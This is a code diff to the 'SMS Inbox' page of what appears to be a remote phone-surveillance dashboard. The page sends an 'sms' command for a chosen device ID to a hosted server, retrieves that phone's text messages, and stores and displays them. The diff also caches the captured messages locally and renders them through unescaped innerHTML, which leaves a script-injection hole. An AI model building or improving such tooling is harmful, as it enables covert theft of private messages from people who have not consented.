@@ -40,11 +40,12 @@
 
         .back-btn {
             text-decoration: none; color: var(--text-main);
-            background: var(--glass-bg); padding: 10px 15px;
+            background: var(--glass-bg); width: 40px; height: 40px;
             border-radius: 50%; border: 1px solid var(--glass-border);
+            display: flex; align-items: center; justify-content: center;
         }
 
-        .title { font-size: 1.5rem; font-weight: bold; display: flex; align-items: center; gap: 10px; }
+        .title { font-size: 1.3rem; font-weight: bold; display: flex; align-items: center; gap: 10px; }
         .title i { color: var(--accent); }
 
         .refresh-btn {
@@ -52,7 +53,11 @@
             color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer;
         }
 
-        .sms-list { display: flex; flex-direction: column; gap: 15px; max-height: 70vh; overflow-y: auto; }
+        .sms-list { display: flex; flex-direction: column; gap: 15px; max-height: 70vh; overflow-y: auto; padding-right: 5px; }
+        
+        /* Scrollbar */
+        .sms-list::-webkit-scrollbar { width: 5px; }
+        .sms-list::-webkit-scrollbar-thumb { background: var(--glass-border); border-radius: 10px; }
 
         .sms-card {
             background: var(--glass-bg); border: 1px solid var(--glass-border);
@@ -73,90 +78,108 @@
             word-wrap: break-word;
         }
 
-        .empty-state { text-align: center; padding: 60px; color: var(--text-muted); }
-        .empty-state i { font-size: 3rem; margin-bottom: 15px; opacity: 0.5; }
+        .status-msg { text-align: center; padding: 60px; color: var(--text-muted); }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div class="header">
-            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
             <div class="title"><i class="fa-solid fa-comments"></i> SMS Inbox</div>
-            <button onclick="fetchSMS()" class="refresh-btn"><i class="fa-solid fa-rotate"></i></button>
+            <button onclick="fetchSMS()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-rotate"></i></button>
         </div>
 
         <div id="sms-list" class="sms-list">
-            <div class="empty-state">
-                <i class="fa-solid fa-spinner fa-spin"></i>
-                <p>Requesting Messages...</p>
             </div>
-        </div>
     </div>
 
 <script>
     const SERVER_URL = "https://child-v9no.onrender.com";
-    const DEVICE_ID = "M2103K19I"; 
+    
+    // URL se Device ID uthana
+    const urlParams = new URLSearchParams(window.location.search);
+    const DEVICE_ID = urlParams.get('id');
+    const storageKey = `sms_${DEVICE_ID}`;
 
     document.addEventListener("DOMContentLoaded", function() {
-        sendCommand(); // Phone ko SMS nikalne ka order do
-        setTimeout(fetchSMS, 6000); // 6 sec baad data check karo
+        if (!DEVICE_ID) {
+            alert("Device ID missing! Dashboard se aao.");
+            window.location.href = "index.html";
+            return;
+        }
+
+        // 1. Pehle LocalStorage se load karo
+        loadFromStorage();
+
+        // 2. Command bhejo aur naya data fetch karo
+        sendCommand();
+        setTimeout(fetchSMS, 3000); 
     });
+
+    function loadFromStorage() {
+        const savedData = localStorage.getItem(storageKey);
+        const listContainer = document.getElementById("sms-list");
+        
+        if (savedData) {
+            renderSMS(JSON.parse(savedData));
+        } else {
+            listContainer.innerHTML = `
+                <div class="status-msg">
+                    <i class="fa-solid fa-circle-notch fa-spin" style="font-size:2rem; margin-bottom:10px;"></i>
+                    <p>Requesting Messages from Phone...</p>
+                </div>`;
+        }
+    }
 
     function sendCommand() {
         fetch(`${SERVER_URL}/api/send-command`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ device_id: DEVICE_ID, command: 'sms' })
-        }).then(() => console.log("SMS Command Sent"));
+        });
     }
 
     function fetchSMS() {
-        const listContainer = document.getElementById("sms-list");
+        const btn = document.getElementById("refreshBtn");
+        btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';
 
-        // ✅ FIXED API PATH
-        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${new Date().getTime()}`)
-            .then(response => response.json())
+        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${Date.now()}`)
+            .then(res => res.json())
             .then(data => {
-                if (!data || data.length === 0) {
-                    listContainer.innerHTML = `
-                        <div class="empty-state">
-                            <i class="fa-regular fa-envelope-open"></i>
-                            <p>No SMS received yet. Click refresh in a few seconds.</p>
-                        </div>`;
-                    return;
+                if (data && data.length > 0) {
+                    // 3. LocalStorage mein save karo
+                    localStorage.setItem(storageKey, JSON.stringify(data));
+                    renderSMS(data);
                 }
-
-                listContainer.innerHTML = ""; 
-                
-                // Naye SMS upar dikhane ke liye reverse
-                data.forEach(sms => {
-                    let dateDisplay = sms.date;
-                    if(!isNaN(sms.date)) {
-                        dateDisplay = new Date(parseInt(sms.date)).toLocaleString();
-                    }
-
-                    const smsCard = `
-                        <div class="sms-card">
-                            <div class="sms-header">
-                                <span class="sender"><i class="fa-solid fa-user-secret"></i> ${sms.address || 'Unknown'}</span>
-                                <span class="date">${dateDisplay}</span>
-                            </div>
-                            <div class="message-body">
-                                ${sms.body || 'No Content'}
-                            </div>
-                        </div>
-                    `;
-                    listContainer.innerHTML += smsCard;
-                });
             })
-            .catch(err => {
-                listContainer.innerHTML = `
-                    <div class="empty-state" style="color: #ff4444;">
-                        <i class="fa-solid fa-circle-exclamation"></i>
-                        <p>Waiting for connection...</p>
-                    </div>`;
+            .finally(() => {
+                btn.innerHTML = '<i class="fa-solid fa-rotate"></i>';
             });
+    }
+
+    function renderSMS(data) {
+        const listContainer = document.getElementById("sms-list");
+        listContainer.innerHTML = ""; 
+        
+        // Naye SMS upar dikhane ke liye data reverse kar sakte hain agar server se purane pehle aa rahe hon
+        data.forEach(sms => {
+            let dateDisplay = sms.date;
+            if(!isNaN(sms.date)) {
+                dateDisplay = new Date(parseInt(sms.date)).toLocaleString();
+            }
+
+            listContainer.innerHTML += `
+                <div class="sms-card">
+                    <div class="sms-header">
+                        <span class="sender"><i class="fa-solid fa-comment-dots"></i> ${sms.address || 'Unknown'}</span>
+                        <span class="date">${dateDisplay}</span>
+                    </div>
+                    <div class="message-body">
+                        ${sms.body || 'No Content'}
+                    </div>
+                </div>`;
+        });
     }
 </script>
 </body>
